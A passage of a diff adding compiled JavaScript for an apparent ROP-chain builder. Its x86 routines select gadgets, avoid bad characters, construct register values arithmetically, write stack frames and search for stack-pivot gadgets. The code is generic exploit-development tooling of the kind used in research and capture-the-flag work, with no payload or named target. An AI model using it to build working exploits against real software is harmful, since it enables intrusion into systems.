+        continue;
+      if (dst) {
+        clobbers.add(dst);
+      }
+    }
+    return { clobbers: [...clobbers], fillers, safe, reason };
+  }
+  function poppedRegisterSurvives(gadget, reg) {
+    var _a;
+    const insns = gadget.instructions;
+    const target = (_a = SUBREGISTER_PARENT[reg]) != null ? _a : reg;
+    for (let i = 1; i < insns.length; i++) {
+      const insn = insns[i];
+      const mnemonic = insn.mnemonic.trim().toLowerCase();
+      if (mnemonic === "ret" || mnemonic === "retn")
+        break;
+      const dst = normalizeRegister(insn.operands[0]);
+      if (mnemonic === "pop" && dst === target)
+        return false;
+      if (mnemonic === "xchg") {
+        const a = normalizeRegister(insn.operands[0]);
+        const b = normalizeRegister(insn.operands[1]);
+        if (a === target || b === target)
+          return false;
+        continue;
+      }
+      if (WRITE_DEST_MNEMONICS.has(mnemonic) && dst === target)
+        return false;
+    }
+    return true;
+  }
+  function registerFinalWriteMnemonic(gadget, reg) {
+    var _a;
+    const target = (_a = SUBREGISTER_PARENT[reg]) != null ? _a : reg;
+    let last;
+    const insns = gadget.instructions;
+    for (let i = 0; i < insns.length; i++) {
+      const insn = insns[i];
+      const mnemonic = insn.mnemonic.trim().toLowerCase();
+      if (mnemonic === "ret" || mnemonic === "retn")
+        break;
+      const dst = normalizeRegister(insn.operands[0]);
+      if (mnemonic === "pop" && dst === target) {
+        last = "pop";
+        continue;
+      }
+      if (mnemonic === "xchg") {
+        const a = normalizeRegister(insn.operands[0]);
+        const b = normalizeRegister(insn.operands[1]);
+        if (a === target || b === target)
+          last = "xchg";
+        continue;
+      }
+      if (WRITE_DEST_MNEMONICS.has(mnemonic) && dst === target)
+        last = mnemonic;
+    }
+    return last;
+  }
+  var OPERATION_MNEMONIC = {
+    REGISTER_NEGATE: "neg",
+    REGISTER_NOT: "not",
+    REGISTER_ADD: "add",
+    REGISTER_SUB: "sub"
+  };
+  function collectClobbers(primaryReg, gadgets, scratch) {
+    const set = /* @__PURE__ */ new Set([primaryReg]);
+    if (scratch)
+      set.add(scratch);
+    for (const gadget of gadgets) {
+      for (const reg of gadgetEffects(gadget).clobbers)
+        set.add(reg);
+    }
+    return [...set];
+  }
+  function isBadcharFree(value, badchars) {
+    if (badchars.size === 0)
+      return true;
+    const w = value >>> 0;
+    for (let i = 0; i < 4; i++) {
+      if (badchars.has(w >>> i * 8 & 255))
+        return false;
+    }
+    return true;
+  }
+  var MAX_RET_IMM = 64;
+  function gadgetIsStable(gadget) {
+    const addr = firstKnownAddress(gadget);
+    return addr === void 0 ? true : isAddressStable(addr);
+  }
+  function selectBest(candidates2, preserve) {
+    const withAddr = candidates2.map((g) => ({ gadget: g, retImm: retImmBytes(g), effects: gadgetEffects(g) })).filter((s) => s.retImm >= 0 && s.retImm <= MAX_RET_IMM && firstKnownAddress(s.gadget) !== void 0).filter((s) => s.effects.safe).filter((s) => !preserve || !s.effects.clobbers.some((r) => preserve.has(r)));
+    if (withAddr.length === 0)
+      return void 0;
+    withAddr.sort((a, b) => {
+      const aStable = gadgetIsStable(a.gadget) ? 0 : 1;
+      const bStable = gadgetIsStable(b.gadget) ? 0 : 1;
+      if (aStable !== bStable)
+        return aStable - bStable;
+      if (a.retImm !== b.retImm)
+        return a.retImm - b.retImm;
+      const aCost = a.effects.clobbers.length + a.effects.fillers.length;
+      const bCost = b.effects.clobbers.length + b.effects.fillers.length;
+      if (aCost !== bCost)
+        return aCost - bCost;
+      return b.gadget.score - a.gadget.score;
+    });
+    return { gadget: withAddr[0].gadget, retImm: withAddr[0].retImm };
+  }
+  function gadgetStep(sel, comment) {
+    return { kind: "gadget", address: firstKnownAddress(sel.gadget), comment };
+  }
+  function valueStep(value, comment) {
+    return { kind: "value", value: value >>> 0, comment };
+  }
+  function extraPopSteps(gadget) {
+    return gadgetEffects(gadget).fillers;
+  }
+  function capKey(kind, register2, targetRegister) {
+    return [kind, register2 != null ? register2 : "", targetRegister != null ? targetRegister : ""].join(":");
+  }
+  function findPopGadget(index, reg, preserve) {
+    var _a;
+    const candidates2 = (_a = index.capabilityMap.get(capKey("LOAD_REGISTER", reg))) != null ? _a : [];
+    const purePopRet = candidates2.filter((g) => {
+      var _a2;
+      if (g.instructions.length < 2)
+        return false;
+      const last = g.instructions[g.instructions.length - 1];
+      if (last.mnemonic !== "ret")
+        return false;
+      return g.instructions[0].mnemonic === "pop" && ((_a2 = g.instructions[0].operands[0]) == null ? void 0 : _a2.trim().toLowerCase()) === reg && poppedRegisterSurvives(g, reg);
+    });
+    return selectBest(purePopRet, preserve);
+  }
+  function findZeroGadget(index, reg, preserve) {
+    var _a;
+    const candidates2 = (_a = index.capabilityMap.get(capKey("ZERO_REGISTER", reg))) != null ? _a : [];
+    const pureXorRet = candidates2.filter((g) => {
+      var _a2, _b;
+      if (g.instructions.length !== 2)
+        return false;
+      const [xor, ret] = g.instructions;
+      return xor.mnemonic === "xor" && ((_a2 = xor.operands[0]) == null ? void 0 : _a2.trim().toLowerCase()) === reg && ((_b = xor.operands[1]) == null ? void 0 : _b.trim().toLowerCase()) === reg && ret.mnemonic === "ret";
+    });
+    return selectBest(pureXorRet, preserve);
+  }
+  function findUnaryGadget(index, kind, reg, preserve) {
+    var _a;
+    const candidates2 = (_a = index.capabilityMap.get(capKey(kind, reg))) != null ? _a : [];
+    const expected = OPERATION_MNEMONIC[kind];
+    const valid = candidates2.filter((g) => {
+      const last = g.instructions[g.instructions.length - 1];
+      if ((last == null ? void 0 : last.mnemonic) !== "ret")
+        return false;
+      return expected === void 0 || registerFinalWriteMnemonic(g, reg) === expected;
+    });
+    return selectBest(valid, preserve);
+  }
+  function findBinaryGadget(index, kind, dst, src, preserve) {
+    var _a;
+    const candidates2 = (_a = index.capabilityMap.get(capKey(kind, dst, src))) != null ? _a : [];
+    const expected = OPERATION_MNEMONIC[kind];
+    const valid = candidates2.filter((g) => {
+      const last = g.instructions[g.instructions.length - 1];
+      if ((last == null ? void 0 : last.mnemonic) !== "ret")
+        return false;
+      return expected === void 0 || registerFinalWriteMnemonic(g, dst) === expected;
+    });
+    return selectBest(valid, preserve);
+  }
+  function emitGadgetWithSideEffects(sel, comment) {
+    const steps = [gadgetStep(sel, comment)];
+    steps.push(...extraPopSteps(sel.gadget));
+    steps.push(...retImmPadding(sel.retImm));
+    return steps;
+  }
+  function findTwoValueDecomposition(target, badchars, mode) {
+    const t = target >>> 0;
+    const probes = [
+      16843009,
+      33686018,
+      50529027,
+      67372036,
+      84215045,
+      101058054,
+      117901063,
+      134744072,
+      151587081,
+      185273099,
+      202116108,
+      235802126,
+      252645135,
+      269488144,
+      286331153,
+      538976288,
+      808464432,
+      1077952576,
+      1347440720,
+      2139062143,
+      2155905152,
+      4278124286,
+      305419896,
+      1431655765,
+      2863311530
+    ];
+    for (const a of probes) {
+      if (!isBadcharFree(a, badchars))
+        continue;
+      const b = mode === "add" ? t - a >>> 0 : a - t >>> 0;
+      if (isBadcharFree(b, badchars))
+        return { a, b };
+    }
+    for (let ab0 = 1; ab0 < 256; ab0++) {
+      if (badchars.has(ab0))
+        continue;
+      const a = ab0 | ab0 << 8 | ab0 << 16 | ab0 << 24;
+      const b = mode === "add" ? t - a >>> 0 : a - t >>> 0;
+      if (isBadcharFree(b, badchars))
+        return { a, b };
+    }
+    return void 0;
+  }
+  function valueComment2(reg, value) {
+    return `${reg} = ${hex32(value >>> 0)}`;
+  }
+  function tryDirect(index, reg, value, badchars, preserve) {
+    if (!isBadcharFree(value, badchars))
+      return void 0;
+    const pop = findPopGadget(index, reg, preserve);
+    if (!pop)
+      return void 0;
+    const steps = [
+      ...emitGadgetWithSideEffects(pop, `pop ${reg}`)
+    ];
+    steps.splice(1, 0, valueStep(value, valueComment2(reg, value)));
+    return { steps, recipe: "direct", stackBytes: steps.length * 4, clobbers: collectClobbers(reg, [pop.gadget]) };
+  }
+  function tryNegate(index, reg, value, badchars, preserve) {
+    const negValue = -value >>> 0;
+    if (!isBadcharFree(negValue, badchars))
+      return void 0;
+    const pop = findPopGadget(index, reg, preserve);
+    const neg = findUnaryGadget(index, "REGISTER_NEGATE", reg, preserve);
+    if (!pop || !neg)
+      return void 0;
+    const steps = [
+      ...emitGadgetWithSideEffects(pop, `pop ${reg}`)
+    ];
+    steps.splice(1, 0, valueStep(negValue, `${reg} = neg(${hex32(value >>> 0)}) = ${hex32(negValue)}`));
+    steps.push(...emitGadgetWithSideEffects(neg, `neg ${reg} -> ${hex32(value >>> 0)}`));
+    return { steps, recipe: "negate", stackBytes: steps.length * 4, clobbers: collectClobbers(reg, [pop.gadget, neg.gadget]) };
+  }
+  function tryComplement(index, reg, value, badchars, preserve) {
+    const notValue = ~value >>> 0;
+    if (!isBadcharFree(notValue, badchars))
+      return void 0;
+    const pop = findPopGadget(index, reg, preserve);
+    const not = findUnaryGadget(index, "REGISTER_NOT", reg, preserve);
+    if (!pop || !not)
+      return void 0;
+    const steps = [
+      ...emitGadgetWithSideEffects(pop, `pop ${reg}`)
+    ];
+    steps.splice(1, 0, valueStep(notValue, `${reg} = not(${hex32(value >>> 0)}) = ${hex32(notValue)}`));
+    steps.push(...emitGadgetWithSideEffects(not, `not ${reg} -> ${hex32(value >>> 0)}`));
+    return { steps, recipe: "complement", stackBytes: steps.length * 4, clobbers: collectClobbers(reg, [pop.gadget, not.gadget]) };
+  }
+  function tryTwoOp(index, reg, value, badchars, preserve, mode) {
+    const decomp = findTwoValueDecomposition(value, badchars, mode);
+    if (!decomp)
+      return void 0;
+    const capKind = mode === "add" ? "REGISTER_ADD" : "REGISTER_SUB";
+    const pop = findPopGadget(index, reg, preserve);
+    if (!pop)
+      return void 0;
+    let best;
+    for (const scratch of SCRATCH_CANDIDATES) {
+      if (scratch === reg || preserve.has(scratch))
+        continue;
+      const binGadget = findBinaryGadget(index, capKind, reg, scratch, preserve);
+      if (!binGadget)
+        continue;
+      const scratchPop = findPopGadget(index, scratch, preserve);
+      if (!scratchPop)
+        continue;
+      const steps = [];
+      const popSteps = emitGadgetWithSideEffects(pop, `pop ${reg}`);
+      popSteps.splice(1, 0, valueStep(decomp.a, `${reg} = ${hex32(decomp.a)}`));
+      steps.push(...popSteps);
+      const scratchSteps = emitGadgetWithSideEffects(scratchPop, `pop ${scratch}`);
+      scratchSteps.splice(1, 0, valueStep(decomp.b, `${scratch} = ${hex32(decomp.b)}`));
+      steps.push(...scratchSteps);
+      const op4 = mode === "add" ? "add" : "sub";
+      steps.push(...emitGadgetWithSideEffects(binGadget, `${op4} ${reg}, ${scratch} -> ${hex32(value >>> 0)}`));
+      const recipe = {
+        steps,
+        recipe: mode === "add" ? "two-add" : "two-sub",
+        scratchRegister: scratch,
+        stackBytes: steps.length * 4,
+        clobbers: collectClobbers(reg, [pop.gadget, scratchPop.gadget, binGadget.gadget], scratch)
+      };
+      if (!best || recipe.stackBytes < best.stackBytes)
+        best = recipe;
+    }
+    return best;
+  }
+  function tryZeroAdd(index, reg, value, badchars, preserve) {
+    if (!isBadcharFree(value, badchars))
+      return void 0;
+    const zero = findZeroGadget(index, reg, preserve);
+    if (!zero)
+      return void 0;
+    for (const scratch of SCRATCH_CANDIDATES) {
+      if (scratch === reg || preserve.has(scratch))
+        continue;
+      const addGadget = findBinaryGadget(index, "REGISTER_ADD", reg, scratch, preserve);
+      if (!addGadget)
+        continue;
+      const scratchPop = findPopGadget(index, scratch, preserve);
+      if (!scratchPop)
+        continue;
+      const steps = [];
+      steps.push(...emitGadgetWithSideEffects(zero, `xor ${reg}, ${reg}`));
+      const scratchSteps = emitGadgetWithSideEffects(scratchPop, `pop ${scratch}`);
+      scratchSteps.splice(1, 0, valueStep(value, `${scratch} = ${hex32(value >>> 0)}`));
+      steps.push(...scratchSteps);
+      steps.push(...emitGadgetWithSideEffects(addGadget, `add ${reg}, ${scratch} -> ${hex32(value >>> 0)}`));
+      return {
+        steps,
+        recipe: "zero-add",
+        scratchRegister: scratch,
+        stackBytes: steps.length * 4,
+        clobbers: collectClobbers(reg, [zero.gadget, scratchPop.gadget, addGadget.gadget], scratch)
+      };
+    }
+    return void 0;
+  }
+  function tryZeroSubNeg(index, reg, value, badchars, preserve) {
+    if (!isBadcharFree(value, badchars))
+      return void 0;
+    const zero = findZeroGadget(index, reg, preserve);
+    const neg = findUnaryGadget(index, "REGISTER_NEGATE", reg, preserve);
+    if (!zero || !neg)
+      return void 0;
+    for (const scratch of SCRATCH_CANDIDATES) {
+      if (scratch === reg || preserve.has(scratch))
+        continue;
+      const subGadget = findBinaryGadget(index, "REGISTER_SUB", reg, scratch, preserve);
+      if (!subGadget)
+        continue;
+      const scratchPop = findPopGadget(index, scratch, preserve);
+      if (!scratchPop)
+        continue;
+      const steps = [];
+      steps.push(...emitGadgetWithSideEffects(zero, `xor ${reg}, ${reg}`));
+      const scratchSteps = emitGadgetWithSideEffects(scratchPop, `pop ${scratch}`);
+      scratchSteps.splice(1, 0, valueStep(value, `${scratch} = ${hex32(value >>> 0)}`));
+      steps.push(...scratchSteps);
+      steps.push(...emitGadgetWithSideEffects(subGadget, `sub ${reg}, ${scratch} -> neg(${hex32(value >>> 0)})`));
+      steps.push(...emitGadgetWithSideEffects(neg, `neg ${reg} -> ${hex32(value >>> 0)}`));
+      return {
+        steps,
+        recipe: "zero-sub-neg",
+        scratchRegister: scratch,
+        stackBytes: steps.length * 4,
+        clobbers: collectClobbers(reg, [zero.gadget, scratchPop.gadget, subGadget.gadget, neg.gadget], scratch)
+      };
+    }
+    return void 0;
+  }
+  function solveValue(index, register2, value, badchars, preserveRegisters = [], preferStable) {
+    var _a, _b, _c, _d, _e, _f;
+    const reg = register2.trim().toLowerCase();
+    const v = value >>> 0;
+    const bc = new Set(badchars.map((b) => b & 255));
+    const preserve = new Set(preserveRegisters.map((r) => r.trim().toLowerCase()));
+    preserve.delete(reg);
+    const prevHint = getStableAddressHint();
+    setStableAddressHint(preferStable != null ? preferStable : prevHint);
+    try {
+      return (_f = (_e = (_d = (_c = (_b = (_a = tryDirect(index, reg, v, bc, preserve)) != null ? _a : tryNegate(index, reg, v, bc, preserve)) != null ? _b : tryComplement(index, reg, v, bc, preserve)) != null ? _c : tryTwoOp(index, reg, v, bc, preserve, "add")) != null ? _d : tryTwoOp(index, reg, v, bc, preserve, "sub")) != null ? _e : tryZeroAdd(index, reg, v, bc, preserve)) != null ? _f : tryZeroSubNeg(index, reg, v, bc, preserve);
+    } finally {
+      setStableAddressHint(prevHint);
+    }
+  }
+
+  // src/rop/register_setup.ts
+  var SUBREGISTER_PARENT2 = {
+    ax: "eax",
+    al: "eax",
+    ah: "eax",
+    bx: "ebx",
+    bl: "ebx",
+    bh: "ebx",
+    cx: "ecx",
+    cl: "ecx",
+    ch: "ecx",
+    dx: "edx",
+    dl: "edx",
+    dh: "edx",
+    si: "esi",
+    di: "edi",
+    bp: "ebp",
+    sp: "esp"
+  };
+  var X86_REGISTERS2 = /* @__PURE__ */ new Set([
+    "eax",
+    "ebx",
+    "ecx",
+    "edx",
+    "esi",
+    "edi",
+    "ebp",
+    "esp",
+    ...Object.keys(SUBREGISTER_PARENT2)
+  ]);
+  var STACK_UNSAFE_MNEMONICS2 = /* @__PURE__ */ new Set(["push", "pusha", "pushad", "leave", "enter", "call", "jmp", "int", "iret"]);
+  function parent(reg) {
+    var _a;
+    return (_a = SUBREGISTER_PARENT2[reg]) != null ? _a : reg;
+  }
+  function normalizeRegister2(operand) {
+    const reg = operand == null ? void 0 : operand.trim().toLowerCase();
+    if (!reg || !X86_REGISTERS2.has(reg))
+      return void 0;
+    return parent(reg);
+  }
+  function parseImmediate2(operand) {
+    if (operand === void 0)
+      return void 0;
+    const t = operand.trim().toLowerCase();
+    if (/^0x[0-9a-f]+$/.test(t))
+      return parseInt(t, 16);
+    if (/^[0-9]+$/.test(t))
+      return parseInt(t, 10);
+    if (/^[0-9a-f]+h$/.test(t))
+      return parseInt(t.slice(0, -1), 16);
+    return void 0;
+  }
+  function analyzeGadget(gadget) {
+    var _a, _b;
+    const popRegs = [];
+    const writes2 = /* @__PURE__ */ new Set();
+    const espFillers = [];
+    const lastWriteWasPop = /* @__PURE__ */ new Map();
+    let safe = true;
+    const insns = gadget.instructions;
+    for (let i = 0; i < insns.length; i++) {
+      const insn = insns[i];
+      const mnemonic = insn.mnemonic.trim().toLowerCase();
+      if (mnemonic === "ret" || mnemonic === "retn")
+        break;
+      const rawDst = (_a = insn.operands[0]) == null ? void 0 : _a.trim().toLowerCase();
+      const dst = normalizeRegister2(insn.operands[0]);
+      if (mnemonic === "pop") {
+        const reg = (_b = dst != null ? dst : rawDst) != null ? _b : "?";
+        popRegs.push(reg);
+        writes2.add(reg);
+        lastWriteWasPop.set(reg, true);
+        continue;
+      }
+      if ((mnemonic === "add" || mnemonic === "sub") && rawDst === "esp") {
+        const imm = parseImmediate2(insn.operands[1]);
+        if (imm === void 0 || imm % 4 !== 0 || mnemonic === "sub") {
+          safe = false;
+          continue;
+        }
+        for (let k = 0; k < imm / 4; k++) {
+          espFillers.push({ kind: "value", value: 1094795585, comment: `junk (add esp, 0x${imm.toString(16)})` });
+        }
+        continue;
+      }
+      if (STACK_UNSAFE_MNEMONICS2.has(mnemonic)) {
+        safe = false;
+        continue;
+      }
+      if (dst === "esp") {
+        safe = false;
+        continue;
+      }
+      if (mnemonic === "xchg") {
+        const a = normalizeRegister2(insn.operands[0]);
+        const b = normalizeRegister2(insn.operands[1]);
+        if (a === "esp" || b === "esp") {
+          safe = false;
+          continue;
+        }
+        if (a) {
+          writes2.add(a);
+          lastWriteWasPop.set(a, false);
+        }
+        if (b) {
+          writes2.add(b);
+          lastWriteWasPop.set(b, false);
+        }
+        continue;
+      }
+      if (mnemonic === "cmp" || mnemonic === "test" || mnemonic === "nop")
+        continue;
+      if (dst) {
+        writes2.add(dst);
+        lastWriteWasPop.set(dst, false);
+      }
+    }
+    const cleanPops = /* @__PURE__ */ new Set();
+    for (const [reg, wasPop] of lastWriteWasPop) {
+      if (wasPop)
+        cleanPops.add(reg);
+    }
+    return { popRegs, cleanPops, writes: writes2, espFillers, safe };
+  }
+  function describeGadget(gadget) {
+    return gadget.instructions.map((insn) => insn.operands.length > 0 ? `${insn.mnemonic} ${insn.operands.join(", ")}` : insn.mnemonic).join(" ; ");
+  }
+  function isBadcharFree2(value, badchars) {
+    if (badchars.size === 0)
+      return true;
+    const w = value >>> 0;
+    for (let i = 0; i < 4; i++) {
+      if (badchars.has(w >>> i * 8 & 255))
+        return false;
+    }
+    return true;
+  }
+  function addressBadcharFree(address, badchars) {
+    return isBadcharFree2(Number(__bi.and(address, __bi(4294967295))), badchars);
+  }
+  function planRegisterSetupPacking(index, targets, badchars = [], preferStable) {
+    const prevHint = getStableAddressHint();
+    setStableAddressHint(preferStable != null ? preferStable : prevHint);
+    try {
+      return planRegisterSetupPackingInner(index, targets, badchars);
+    } finally {
+      setStableAddressHint(prevHint);
+    }
+  }
+  function planRegisterSetupPackingInner(index, targets, badchars = []) {
+    var _a, _b;
+    const bc = new Set(badchars.map((b) => b & 255));
+    const targetValues = /* @__PURE__ */ new Map();
+    for (const [reg, value] of Object.entries(targets)) {
+      targetValues.set(parent(reg.trim().toLowerCase()), value >>> 0);
+    }
+    const workingIndex = bc.size === 0 ? index : buildCapabilities(index.gadgets.filter((g) => {
+      const addr = firstKnownAddress(g);
+      return addr === void 0 || addressBadcharFree(addr, bc);
+    }));
+    const MAX_RET_IMM2 = 64;
+    const candidates2 = workingIndex.gadgets.map((gadget) => ({ gadget, shape: analyzeGadget(gadget), address: firstKnownAddress(gadget), retImm: retImmBytes(gadget) })).filter((c) => c.address !== void 0 && c.retImm >= 0 && c.retImm <= MAX_RET_IMM2 && c.shape.safe && c.shape.popRegs.length > 0).map((c) => ({ gadget: c.gadget, shape: c.shape, address: c.address, retImm: c.retImm, score: c.gadget.score }));
+    const clobberFrequency = /* @__PURE__ */ new Map();
+    for (const c of candidates2) {
+      for (const reg of c.shape.writes)
+        clobberFrequency.set(reg, ((_a = clobberFrequency.get(reg)) != null ? _a : 0) + 1);
+    }
+    const pending = new Set(targetValues.keys());
+    const done = /* @__PURE__ */ new Set();
+    const steps = [];
+    const ordered = [];
+    const keyGreater = (a, b) => {
+      if (!b)
+        return true;
+      for (let i = 0; i < a.length; i++) {
+        if (a[i] !== b[i])
+          return a[i] > b[i];
+      }
+      return false;
+    };
+    while (pending.size > 0) {
+      let best;
+      let bestKey;
+      for (const candidate of candidates2) {
+        if (!addressBadcharFree(candidate.address, bc))
+          continue;
+        let corrupts = false;
+        for (const reg of candidate.shape.writes) {
+          if (done.has(reg)) {
+            corrupts = true;
+            break;
+          }
+        }
+        if (corrupts)
+          continue;
+        const cover = /* @__PURE__ */ new Set();
+        for (const reg of candidate.shape.cleanPops) {
+          if (!pending.has(reg))
+            continue;
+          if (!isBadcharFree2(targetValues.get(reg), bc))
+            continue;
+          cover.add(reg);
+        }
+        if (cover.size === 0)
+          continue;
+        const waste = candidate.shape.writes.size - cover.size + candidate.shape.espFillers.length;
+        let deferSum = 0;
+        for (const reg of cover)
+          deferSum += (_b = clobberFrequency.get(reg)) != null ? _b : 0;
+        const stable = isAddressStable(candidate.address) ? 1 : 0;
+        const key2 = [stable, cover.size, -deferSum, -waste, candidate.score, -candidate.retImm];
+        if (keyGreater(key2, bestKey)) {
+          bestKey = key2;
+          best = { candidate, cover };
+        }
+      }
+      if (best) {
+        const { candidate, cover } = best;
+        steps.push({ kind: "gadget", address: candidate.address, comment: describeGadget(candidate.gadget) });
+        const lastIndexOf = /* @__PURE__ */ new Map();
+        candidate.shape.popRegs.forEach((reg, idx) => lastIndexOf.set(reg, idx));
+        candidate.shape.popRegs.forEach((reg, idx) => {
+          if (cover.has(reg) && lastIndexOf.get(reg) === idx) {
+            steps.push({ kind: "value", value: targetValues.get(reg) >>> 0, comment: `${reg} = ${hex32(targetValues.get(reg))}` });
+          } else {
+            steps.push({ kind: "value", value: 1094795585, comment: `junk (${reg})` });
+          }
+        });
+        steps.push(...candidate.shape.espFillers);
+        steps.push(...retImmPadding(candidate.retImm));
+        for (const reg of cover) {
+          pending.delete(reg);
+          done.add(reg);
+          ordered.push(reg);
+        }
+        continue;
+      }
+      const arith = pickArithmeticBuild(workingIndex, pending, targetValues, badchars, done, keyGreater);
+      if (!arith)
+        break;
+      steps.push(...arith.recipe.steps);
+      pending.delete(arith.register);
+      done.add(arith.register);
+      ordered.push(arith.register);
+    }
+    const unresolved = [...pending].map((reg) => ({ register: reg, reason: reasonFor(reg, workingIndex, candidates2, done, targetValues, badchars, bc) }));
+    const finalSteps = fixRetImmPadding(steps);
+    return { steps: finalSteps, ordered, unresolved, stackBytes: finalSteps.length * 4, success: unresolved.length === 0 };
+  }
+  function pickArithmeticBuild(index, pending, targetValues, badchars, done, keyGreater) {
+    const preserve = [...done];
+    let best;
+    let bestKey;
+    for (const reg of pending) {
+      const recipe = solveValue(index, reg, targetValues.get(reg), badchars, preserve);
+      if (!recipe)
+        continue;
+      const scratchIsPendingTarget = recipe.scratchRegister && pending.has(recipe.scratchRegister) ? 1 : 0;
+      const usesScratch = recipe.scratchRegister ? 1 : 0;
+      const key2 = [scratchIsPendingTarget, usesScratch, -recipe.stackBytes];
+      if (keyGreater(key2, bestKey)) {
+        bestKey = key2;
+        best = { register: reg, recipe };
+      }
+    }
+    return best;
+  }
+  function reasonFor(reg, index, candidates2, done, targetValues, badcharList, badchars) {
+    const buildableSomehow = solveValue(index, reg, targetValues.get(reg), badcharList) !== void 0;
+    const buildablePreserving = solveValue(index, reg, targetValues.get(reg), badcharList, [...done]) !== void 0;
+    if (buildableSomehow && !buildablePreserving) {
+      return `can only be built using a register already finalized (${[...done].join(", ")}) as scratch; too many registers were set before it \u2014 free a scratch register or build ${reg} earlier`;
+    }
+    if (!buildableSomehow) {
+      return `no pop/arithmetic construction found for ${hex32(targetValues.get(reg))} under these badchars and gadgets`;
+    }
+    const setters = candidates2.filter((c) => c.shape.cleanPops.has(reg));
+    if (setters.length === 0)
+      return `no safe gadget cleanly pops ${reg}`;
+    if (!isBadcharFree2(targetValues.get(reg), badchars)) {
+      return `value ${hex32(targetValues.get(reg))} contains badchars; build it with rop.construct("${reg}", ...) and set it separately`;
+    }
+    const blockers = /* @__PURE__ */ new Set();
+    for (const setter of setters) {
+      for (const w of setter.shape.writes) {
+        if (w !== reg && done.has(w))
+          blockers.add(w);
+      }
+    }
+    if (blockers.size > 0) {
+      return `every gadget that sets ${reg} also writes already-finalized ${[...blockers].join(", ")}; no ordering avoids the clobber`;
+    }
+    return `no gadget sets ${reg} without a badchar in its address`;
+  }
+
+  // src/rop/frame_write.ts
+  function lastIsRet(g) {
+    const last = g.instructions[g.instructions.length - 1];
+    return (last == null ? void 0 : last.mnemonic) === "ret";
+  }
+  function op(g, i, n) {
+    var _a, _b;
+    return ((_b = (_a = g.instructions[i]) == null ? void 0 : _a.operands[n]) != null ? _b : "").trim().toLowerCase();
+  }
+  function isBadcharFree3(value, badchars) {
+    if (badchars.size === 0)
+      return true;
+    const w = value >>> 0;
+    for (let i = 0; i < 4; i++)
+      if (badchars.has(w >>> i * 8 & 255))
+        return false;
+    return true;
+  }
+  function pickBest(cands) {
+    return [...cands].filter((g) => firstKnownAddress(g) !== void 0 && retImmBytes(g) >= 0).sort((a, b) => {
+      const sa = isAddressStable(firstKnownAddress(a)) ? 0 : 1;
+      const sb = isAddressStable(firstKnownAddress(b)) ? 0 : 1;
+      if (sa !== sb)
+        return sa - sb;
+      if (a.instructions.length !== b.instructions.length)
+        return a.instructions.length - b.instructions.length;
+      if (retImmBytes(a) !== retImmBytes(b))
+        return retImmBytes(a) - retImmBytes(b);
+      return b.score - a.score;
+    })[0];
+  }
+  var VALUE_REGS = ["ecx", "edx", "ebx", "esi", "edi", "ebp"];
+  function findStores(index) {
+    var _a;
+    const byReg = /* @__PURE__ */ new Map();
+    for (const g of index.gadgets) {
+      if (g.instructions.length !== 2 || g.instructions[0].mnemonic !== "mov" || !lastIsRet(g))
+        continue;
+      if (!/\[eax\]$/.test(op(g, 0, 0)))
+        continue;
+      const reg = op(g, 0, 1);
+      if (!VALUE_REGS.includes(reg))
+        continue;
+      ((_a = byReg.get(reg)) != null ? _a : byReg.set(reg, []).get(reg)).push(g);
+    }
+    const stores = [];
+    for (const [reg, gadgets] of byReg) {
+      const best = pickBest(gadgets);
+      if (best)
+        stores.push({ gadget: best, reg });
+    }
+    return stores;
+  }
+  function findAdvance(index) {
+    const cands = index.gadgets.filter((g) => {
+      if (!lastIsRet(g))
+        return false;
+      if (g.instructions[0].mnemonic !== "add")
+        return false;
+      if (op(g, 0, 0) !== "eax")
+        return false;
+      const imm = op(g, 0, 1);
+      return imm === "0x4" || imm === "4";
+    });
+    const gadget = pickBest(cands);
+    if (!gadget)
+      return void 0;
+    let junkPops = 0;
+    for (let i = 1; i < gadget.instructions.length - 1; i++) {
+      if (gadget.instructions[i].mnemonic === "pop")
+        junkPops++;
+    }
+    return { gadget, junkPops };
+  }
+  function findPivot(index) {
+    var _a;
+    const xchg = index.gadgets.filter((g) => g.instructions.length === 2 && g.instructions[0].mnemonic === "xchg" && lastIsRet(g) && (op(g, 0, 0) === "eax" && op(g, 0, 1) === "esp" || op(g, 0, 0) === "esp" && op(g, 0, 1) === "eax"));
+    const movEsp = index.gadgets.filter((g) => {
+      var _a2;
+      return ((_a2 = g.instructions[0]) == null ? void 0 : _a2.mnemonic) === "mov" && op(g, 0, 0) === "esp" && op(g, 0, 1) === "eax" && lastIsRet(g);
+    });
+    return (_a = pickBest(xchg)) != null ? _a : pickBest(movEsp);
+  }
+  function findCleanPop(index, reg) {
+    return pickBest(index.gadgets.filter((g) => g.instructions.length === 2 && g.instructions[0].mnemonic === "pop" && op(g, 0, 0) === reg && lastIsRet(g)));
+  }
+  function findMemLoads(index, valRegs) {
+    const out = [];
+    for (const g of index.gadgets) {
+      if (g.instructions.length !== 2 || g.instructions[0].mnemonic !== "mov" || !lastIsRet(g))
+        continue;
+      const dst = op(g, 0, 0);
+      if (!valRegs.includes(dst) || dst === "eax")
+        continue;
+      const m = /\[(eax|ebx|ecx|edx|esi|edi|ebp)\]$/.exec(op(g, 0, 1));
+      if (!m || m[1] === "eax")
+        continue;
+      out.push({ gadget: g, valReg: dst, ptrReg: m[1] });
+    }
+    return out.sort((a, b) => (isAddressStable(firstKnownAddress(a.gadget)) ? 0 : 1) - (isAddressStable(firstKnownAddress(b.gadget)) ? 0 : 1));
+  }
+  function gadgetStep2(g, comment) {
+    return { kind: "gadget", address: firstKnownAddress(g), comment };
+  }
+  function planWriteFrame(index, bufAddress, words2, badchars = [], preferStable) {
+    const prevHint = getStableAddressHint();
+    setStableAddressHint(preferStable != null ? preferStable : prevHint);
+    try {
+      return planWriteFrameInner(index, bufAddress, words2, badchars);
+    } finally {
+      setStableAddressHint(prevHint);
+    }
+  }
+  function planWriteFrameInner(index, bufAddress, words2, badchars) {
+    var _a, _b, _c;
+    const bc = new Set(badchars.map((b) => b & 255));
+    const unsatisfied = [];
+    const placeholders = /* @__PURE__ */ new Set();
+    const stores = findStores(index);
+    const advance = findAdvance(index);
+    const pivot = findPivot(index);
+    const popEax = findCleanPop(index, "eax");
+    const popByReg = /* @__PURE__ */ new Map();
+    const popFor = (reg) => {
+      if (!popByReg.has(reg))
+        popByReg.set(reg, findCleanPop(index, reg));
+      return popByReg.get(reg);
+    };
+    if (stores.length === 0)
+      unsatisfied.push("no `mov [eax], <reg> ; ret` store gadget");
+    if (!popEax)
+      unsatisfied.push("no clean `pop eax ; ret`");
+    if (words2.length > 1 && !advance)
+      unsatisfied.push("no `add eax, 4 ; ret` pointer-advance gadget");
+    if (!pivot)
